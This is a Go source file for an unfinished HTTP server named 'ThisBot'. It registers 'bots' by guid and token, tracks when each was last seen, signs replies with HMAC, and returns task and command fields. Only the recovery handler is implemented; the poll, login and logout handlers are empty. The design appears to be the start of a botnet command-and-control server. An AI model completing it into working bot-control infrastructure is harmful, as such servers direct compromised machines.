package main

import (
	"ThisBot/common"
	"ThisBot/db"
	"ThisBot/utils"
	"database/sql"
	"encoding/json"
	"log"
	"net/http"
	"strconv"

	"github.com/go-chi/chi/middleware"
	"github.com/go-chi/chi/v5"
)

func http_sender(w http.ResponseWriter, guid, token string, reply *common.ServerReply) error {
	server_time := utils.GenerateUtcTimestampString()

	// Setup http reply's header
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-Guid", guid)
	w.Header().Set("X-Time", server_time)
	bytToken, _ := common.Base64Dec(token)
	hmac := common.HmacSha256(bytToken, []byte(guid+server_time))
	w.Header().Set("X-Sign", common.Base64Enc(hmac))
	// Setup http reply's body
	body, _ := json.Marshal(reply)
	// Send http reply
	_, err := w.Write(body)

	return err
}

func recovery_handler(w http.ResponseWriter, r *http.Request) {
	guid := r.Header.Get("X-Guid")
	time1 := r.Header.Get("X-Time")

	reply := common.ServerReply{
		Args: make(map[string]any),
	}

	reply.Status = 1
	reply.TaskId = 0
	reply.Error = ""
	reply.Cmd = ""

	out_guid := ""
	out_token := ""
	strSql := "select guid, token from clients where guid=?"
	err := db.QueryRow(common.Db, strSql, guid).Scan(&out_guid, &out_token)
	if err == sql.ErrNoRows {
		// No such bot, create bot
		strSql = "insert into clients (guid, token, lastseen) values(?,?,?)"
		// Generate new token
		out_token = common.Base64Enc(utils.GenerateRandomBytes(32))
		_, err = db.Insert(common.Db, strSql, guid, out_token, time1)
		if err != nil {
			// Failed to create a bot
			reply.Status = 0
			reply.Error = "No such bot and failed to create new bot"
		} else {
			// Create bot okay
			reply.Args["Token"] = out_token
		}
	} else if err != nil {
		reply.Status = 0
		reply.Error = "Unknown error"
		log.Println(err.Error())
	} else {
		// Find the bot
		reply.Args["Token"] = out_token
		// Update timestamp lastseen
		strSql = "update clients set lastseen=? where guid=?"
		_, err = db.Exec(common.Db, strSql, time1, out_guid)
		if err != nil {
			reply.Status = 0
			reply.Error = "Find the bot but failed to update"
			log.Println(err.Error())
		}
	}

	err = http_sender(w, guid, out_token, &reply)
	if err != nil {
		log.Println(err.Error())
	}
}

func poll_handler(w http.ResponseWriter, r *http.Request) {

}

func logout_handler(w http.ResponseWriter, r *http.Request) {

}

func login_handler(w http.ResponseWriter, r *http.Request) {

}

func Server() {
	router := chi.NewRouter()

	router.Use(middleware.Logger)
	router.Use(middleware.Recoverer)

	router.Post("/recovery", recovery_handler)
	router.Post("/poll", poll_handler)
	router.Post("/login", login_handler)
	router.Post("/logout", logout_handler)

	strPort := strconv.Itoa(common.Cfg.Server.Port)
	log.Println("[+] Server running on " + common.Cfg.Server.Host + ":" + strPort)

	http.ListenAndServe(":"+strPort, router)
}
